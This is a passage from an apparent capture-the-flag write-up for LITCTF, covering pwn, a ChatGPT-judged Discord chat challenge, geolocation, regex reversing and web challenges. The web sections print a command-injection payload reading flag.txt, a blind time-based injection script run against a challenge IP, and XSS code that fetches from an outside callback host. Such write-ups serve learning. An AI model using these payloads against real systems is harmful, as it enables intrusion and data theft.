<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">heapaddr</span> <span class="o">-</span> <span class="mi">65</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">heapaddr</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>
</pre></table></code></div></div><p>This pdf gives a better outline of what is happening in this exploit: https://drive.google.com/file/d/1g2qIENh2JBWmYgmfTJMJUier8w0XAGDt/view</p><p>flag: <code class="language-plaintext highlighter-rouge">LITCTF{very_legitimate_exit_function}</code></p><h1 id="misc">Misc</h1><h2 id="so-you-think-you-can-talk"><span class="mr-2">So You Think You Can Talk</span><a href="#so-you-think-you-can-talk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>A lot of people think they can….. Well let’s find out in our Discord Server #so-you-think-you-can-talk channel. Beat your competitors by talking most! Send +explain in the channel to get a more detailed explanation of the challenge.</p><hr /><p>This is a misc discord challenge.</p><p>going to that channel we can get more info:</p><p>The bots code:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">messageCreate</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">content</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">2000</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">channelId</span> <span class="o">==</span> <span class="mi">1137653157825089536</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Within the right channel</span>
    <span class="nx">user_id</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">users</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">user_id</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">users</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">user_id</span><span class="p">,</span><span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">globalName</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nx">disabled</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">mentions</span><span class="p">.</span><span class="nx">repliedUser</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">repliedTo</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">channel</span><span class="p">.</span><span class="nx">messages</span><span class="p">.</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">reference</span><span class="p">.</span><span class="nx">messageId</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="nx">repliedTo</span><span class="p">.</span><span class="nx">content</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">2000</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
      <span class="k">if</span><span class="p">(</span><span class="nx">repliedTo</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">id</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
      <span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">createdTimestamp</span> <span class="o">-</span> <span class="nx">repliedTo</span><span class="p">.</span><span class="nx">createdTimestamp</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">60000</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 2 minutes of time</span>
        <span class="k">if</span><span class="p">(</span><span class="k">await</span> <span class="nx">check</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">content</span><span class="p">,</span><span class="nx">repliedTo</span><span class="p">.</span><span class="nx">content</span><span class="p">))</span> <span class="p">{</span>
          <span class="c1">// Yay successfully earn point</span>
          <span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nx">score</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">repliedTo</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">id</span><span class="p">).</span><span class="nx">score</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">repliedTo</span><span class="p">.</span><span class="nx">author</span><span class="p">.</span><span class="nx">id</span><span class="p">).</span><span class="nx">point</span> <span class="o">-</span> <span class="mf">0.4</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
          <span class="nx">msg</span><span class="p">.</span><span class="nx">react</span><span class="p">(</span><span class="dl">'</span><span class="s1">😄</span><span class="dl">'</span><span class="p">);</span>

        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
          <span class="c1">// Nope, you get points off</span>
          <span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nx">score</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nx">score</span> <span class="o">-</span> <span class="mf">0.4</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
          <span class="nx">msg</span><span class="p">.</span><span class="nx">react</span><span class="p">(</span><span class="dl">'</span><span class="s1">😭</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="c1">// [redacted]</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p>and +explain tells us:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>The objective of this game is to talk as much as possible. However, your messages can't just be SPAM, as they will be verified by chatGPT. In order to earn a point, the following criteria must be met:

    You must send the message in this channel
    You must be replying to a message sent by another author
    The message you reply to must be recent and no more than 2 minutes old
    Your comment must be respectful, substanceful, and insightful. ChatGPT gets to decide if you pass this or not.


 Finally, after some set period of time (like 15 minutes), whoever is the highest on the leaderboard will get the flag IF they also have at least 20 points.

If you pass all criterion, you get 1 point. If you pass all but the last criterion, you get deducted 0.4 point. In addition, if somebody replies to you and passes, you get deducted 0.4 points.

Finally, for more details, try the +code command to see the relevant source code.
</pre></table></code></div></div><p>Okay, we we need to respond to others in the channel, our messages will be checked by chatgpt to see if they are “respectful, substanceful, and insightful” and if chatgpt likes the message we get a smiley face, otherwise we get a crying face. Only messages that are responding to other uses will work for this.</p><p>I went to chatgpt and gave it this prompt:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>User
let play a game. I will ask you some random things and they you must be respectful, substanceful, and insightful to me when i ask. do you understand?
</pre></table></code></div></div><p>and got</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Of course, I understand. I'm here to provide respectful, substanceful, and insightful responses to your questions. Feel free to ask anything, and I'll do my best to assist you! Let's start the game.
</pre></table></code></div></div><p>What happened next is a long story.</p><p>in steps Jim.</p><p><img data-src="https://i.imgur.com/28fhoVw.png" alt="" data-proofer-ignore></p><p>I dont know Jim but for around 30-40 minutes Jim would ask random questions which I just threw into chatgpt</p><p><img data-src="https://i.imgur.com/eNidll4.png" alt="" data-proofer-ignore></p><p>Started with:</p><p><code class="language-plaintext highlighter-rouge">I've been thinking about buying a flat keyboard, but I also want coffee. How can I get both?</code></p><p><img data-src="https://i.imgur.com/Y96LWe9.png" alt="" data-proofer-ignore></p><p>My first happy face. I need 20 of these to get the flag.</p><p>The tale look a turn and went from a question of keyboards to Jefferey, who went from getting bullied, to being a bully to stacking what we can assume is Jim. all this time chatgpt was giving “respectful, substanceful, and insightful” replies to the life of Jefferey and Jim. This entire story will soon be a movie, We are just waiting on Netflix to get back to us.</p><p>After close to 40 minutes I got the flag. Only the person in first gets the flag so I was beaten to the spot once, and didnt have 20 points the first time it came around.</p><p>flag: <code class="language-plaintext highlighter-rouge">LITCTF{Huh_1_gu3s5_u_R34lly_c4n_t4lk_4ft3ral1}</code></p><h2 id="geoguessr"><span class="mr-2">geoguessr</span><a href="#geoguessr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Where am I? The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})</p><hr /><p>All I had to go off for this challenge was this image: <img data-src="https://i.imgur.com/TnFE8TF.png" alt="geoguessr.png" data-proofer-ignore></p><p>Going off the challenge name and description, I figured that I needed to find the location that the image was taken. Checking the metadata of the image yielded no results, so to google maps we go!</p><p>First, I had a good look at the image. I noticed that the cars were driving on the right hand side of the road, and there was a speed limit sign that said 55. I immediately thought of America. Further searching of the image, I saw the blue signs on the right of the image, which confirmed to me that it was the USA.</p><p>Zooming in on the image, I could just about make out that the top sign said 87, and the bottom sign was 28- (I wasn’t sure whether the last number was a 1 or a 7).</p><p>I went down a rabbit hole for a little while, looking at different route 87’s in the USA, and eventually found out that the blue signs meant it was an interstate.</p><p>I put I-87 into google maps (other online maps are available :D) where it put me in New York, and made my way up the map until I noticed that it merged into the I-287 for a stretch. At this point, I went into street view and had the picture up as reference. Looking at the background of the picture, I could faintly make out water lines, so I went over the Mario Cuomo bridge and went to the bend on the left (near South Nyack) until I matched what I saw on Google Maps with the original image.</p><p>Using the description as a hint for the flag format, I rounded the last numbers to get the flag.</p><p>flag: <code class="language-plaintext highlighter-rouge">LITCTF{41.077,-73.921}</code></p><h1 id="rev">Rev</h1><h2 id="iloveregex"><span class="mr-2">iloveregex</span><a href="#iloveregex" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For this challenge we are just given the flag regex:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>^LITCTF\{(?&lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\1)(?=.{4}(.).{18}\2)(?=.{6}(.).{2}\3)(?=.{3}(.).{11}\4)(?=.{3}(.).{3}\5)(?=.{16}(.).{4}\6)(?=.{27}(.).{4}\7)(?=.{12}(.).{4}\8)(?=.{3}(.).{8}\9)(?=.{18}(.).{2}\10)(?=.{4}(.).{20}\11)(?=.{11}(.).{2}\12)(?=.{32}(.).{0}\13)(?=.{3}(.).{24}\14)(?=.{12}(.).{9}\15)(?=.{7}(.).{2}\16)(?=.{0}(.).{12}\17)(?=.{13}(.).{5}\18)(?=.{1}(.).{0}\19)(?=.{27}(.).{3}\20)(?=.{8}(.).{17}\21)(?=.{16}(.).{6}\22)(?=.{6}(.).{6}\23)(?=.{0}(.).{1}\24)(?=.{8}(.).{11}\25)(?=.{5}(.).{16}\26)(?=.{29}(.).{1}\27)(?=.{4}(.).{9}\28)(?=.{5}(.).{24}\29)(?=.{15}(.).{10}\30).*}$
</pre></table></code></div></div><p>To approach this I broke it down into parts and manually made matching strings on <a href="https://regexr.com/">RegExr</a>.</p><p>First is the start and end which are literals - <code class="language-plaintext highlighter-rouge">LITCTF{}</code>.</p><p>Next I need to match this regex: <code class="language-plaintext highlighter-rouge">^LITCTF\{(?&lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5}).*}$</code></p><p><code class="language-plaintext highlighter-rouge">(?&lt;=...)</code> is a positive lookbehind, I’m not going to pretend to understand how that works but the whole string must match it in this case.</p><p><code class="language-plaintext highlighter-rouge">(?=...)</code> is a positive lookahead which needs to match everything after the current point in the string (because we’re in the lookbehind this means from the start) but it’s a lookahead meaning the next token in the regex starts at the same point. So <code class="language-plaintext highlighter-rouge">(?=.{42}(?!.))</code> means there is 42 characters after this point and no more.</p><p><code class="language-plaintext highlighter-rouge">.(?=.{24}greg)</code> means 25 characters into the string the next characters are <code class="language-plaintext highlighter-rouge">greg</code></p><p><code class="language-plaintext highlighter-rouge">.(?=.{30}gex)</code> means 32 characters (incl. the dot from previous part) into the string the next characters are <code class="language-plaintext highlighter-rouge">gex</code>.</p><p>Putting that all together we get our first matching string:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>LITCTF{__________________greg___gex______}
</pre></table></code></div></div><p>All the next regex components use lookaheads with backreferences. Backreferences match previously matched parts of the string. So for example \1 will match the first group that was matched.</p><p>Let’s try: <code class="language-plaintext highlighter-rouge">^LITCTF\{(?&lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\1).*}</code></p><p>Weird, our existing string already matches? Yes since most of the characters are underscores the backreferences will match anyway.</p><p>We can’t continue like this however as we will need to figure out what backrfeferences matches what later.</p><p><code class="language-plaintext highlighter-rouge">(?=.{4}(.).{19}\1)</code> means the 20th character matches the 5th character, so let’s replace those with 1 for now:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>LITCTF{____1_____________greg__1gex______}
</pre></table></code></div></div><p>The rest is left as an exercise for the reader. Flag: <code class="language-plaintext highlighter-rouge">LITCTF{rrregereeregergegegregegggexexexxx}</code></p><h1 id="web">Web</h1><h2 id="ping-pong"><span class="mr-2">Ping pong</span><a href="#ping-pong" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The code for this challenge is:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s">'GET'</span><span class="p">,</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">output</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">hostname</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'hostname'</span><span class="p">]</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"ping -c 3 "</span> <span class="o">+</span> <span class="n">hostname</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">output</span><span class="o">=</span><span class="n">output</span><span class="p">)</span>
</pre></table></code></div></div><p>The solution is fairly straight forward, we have command execution as our input is added to a command without any sanitization. Payload: <code class="language-plaintext highlighter-rouge">fbi.gov;cat flag.txt</code> Flag: <code class="language-plaintext highlighter-rouge">LITCTF{I_sh0uld_b3_m0r3_c4r3ful}</code></p><h2 id="ping-pong-under-maintenance"><span class="mr-2">Ping Pong: Under Maintenance</span><a href="#ping-pong-under-maintenance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The next iteration of this is a bit more challenging</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s">'GET'</span><span class="p">,</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">output</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">hostname</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'hostname'</span><span class="p">]</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"ping -c 3 "</span> <span class="o">+</span> <span class="n">hostname</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">output</span><span class="o">=</span><span class="s">'The service is currently under maintainence and we have disabled outbound connections as a result.'</span><span class="p">)</span>
</pre></table></code></div></div><p>This time we don’t get any output and the server doesn’t allow outbound connections (we tested with interactsh and curl, wget and ping to be sure!). However we do have a way to extract information. <code class="language-plaintext highlighter-rouge">;sleep 3</code> will delay the response by 3 seconds. So if we bruteforce the flag character by character and make it sleep when it matches we will have the flag. Here’s the script I made for this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="n">target</span> <span class="o">=</span> <span class="s">'http://34.130.180.82:55943/'</span>
<span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="s">';bash -c </span><span class="se">\'</span><span class="s">flag=`cat flag.txt`;if [ ${flag:'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span> <span class="o">+</span> <span class="s">':1} == "'</span><span class="o">+</span><span class="n">x</span><span class="o">+</span><span class="s">'" ]; then sleep 10; fi</span><span class="se">\'</span><span class="s">'</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'hostname'</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
		<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Char: </span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
			<span class="n">flag</span><span class="o">+=</span><span class="n">x</span>
			<span class="k">if</span> <span class="n">x</span><span class="o">==</span><span class="s">'}'</span><span class="p">:</span>
				<span class="nb">exit</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
			<span class="k">break</span>
		<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="n">total_seconds</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
	<span class="n">pos</span><span class="o">+=</span><span class="mi">1</span>
</pre></table></code></div></div><p>Thankfully the flag wasn’t too long: <code class="language-plaintext highlighter-rouge">LITCTF{c4refu1_fr}</code></p><h2 id="art-contest"><span class="mr-2">Art-Contest</span><a href="#art-contest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge had a lot of steps and in the end was only solved by 7 teams.</p><h3 id="the-goal"><span class="mr-2">The Goal</span><a href="#the-goal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>When doing web challenges, I’ll usually work backwards by first figuring out where the flag is stored and then seeing what functionality can be used to reach that target. In this case, if the <code class="language-plaintext highlighter-rouge">/judge</code> endpoint is called with a valid ID and the bot subsequently opens the status page for the ID and it contains “winner!!” in its text, it will replace the content of the status file with the flag. We can then visit the status page and retrieve the flag. It seems as though we will need to confuse the judge bot into thinking our page contains the aforementioned text.</p><h3 id="xss-via-file-upload-bypass"><span class="mr-2">XSS via file upload bypass</span><a href="#xss-via-file-upload-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>It is possible to upload any file which has either an extension of “txt” or no extension at all. To check the extension, the following code is used: <code class="language-plaintext highlighter-rouge">ext = os.path.splitext(abs_path)[1]</code> This is not a secure means of validating a file extension and we can get XSS by uploading a file with a name such as <code class="language-plaintext highlighter-rouge">...html</code> to the <code class="language-plaintext highlighter-rouge">/upload</code> endpoint. We tried a number of directory traversal tricks here but didn’t find anything of use aside from the XSS. This XSS is useful because the judge bot will visit this file before checking the page status. We can use this to manipulate the bot so that its next request to check the status will contain <code class="language-plaintext highlighter-rouge">winner!!</code>. But how?</p><h3 id="polluting-contextpages"><span class="mr-2">Polluting context.pages</span><a href="#polluting-contextpages" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can see the following code defines <code class="language-plaintext highlighter-rouge">status_page</code>: <code class="language-plaintext highlighter-rouge">status_page = context.pages[1]</code> In order to get the flag, we must see <code class="language-plaintext highlighter-rouge">winner!!</code> in the <code class="language-plaintext highlighter-rouge">status_page.content()</code> method call. We noticed that using the previous XSS to call <code class="language-plaintext highlighter-rouge">window.open()</code> does just that. It will add an additional page to the <code class="language-plaintext highlighter-rouge">context.pages</code> list and it happens to be located at <code class="language-plaintext highlighter-rouge">context.pages[1]</code>in the list! A little known fact is that you can actually modify the content of a <code class="language-plaintext highlighter-rouge">window.open()</code> using code such as:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">my</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">/x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span> <span class="p">,</span><span class="dl">"</span><span class="s2">height=600, width=600</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">my</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
 <span class="nx">my</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">winner!!</span><span class="dl">"</span><span class="p">;</span>
<span class="p">};</span>
</pre></table></code></div></div><p>This would be pass the check for content containing <code class="language-plaintext highlighter-rouge">winner!!</code> but we must also allow for the <code class="language-plaintext highlighter-rouge">status_page.url == "http://localhost:5000/status/" + id</code> check. Herein lies a small issue; we don’t know the value for the <code class="language-plaintext highlighter-rouge">id</code> variable! This isn’t actually such a big problem, we can just upload a separate file and save its ID. Then we have a valid ID to reference. I decided to host this on my server and use a <code class="language-plaintext highlighter-rouge">fetch()</code> to pull its value so I could easily change the ID if I needed:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://ireland.re/callback</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>

<span class="kd">var</span> <span class="nx">my</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://127.0.0.1:5000/status/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span> <span class="p">,</span><span class="dl">"</span><span class="s2">height=600, width=600</span><span class="dl">"</span><span class="p">);</span>

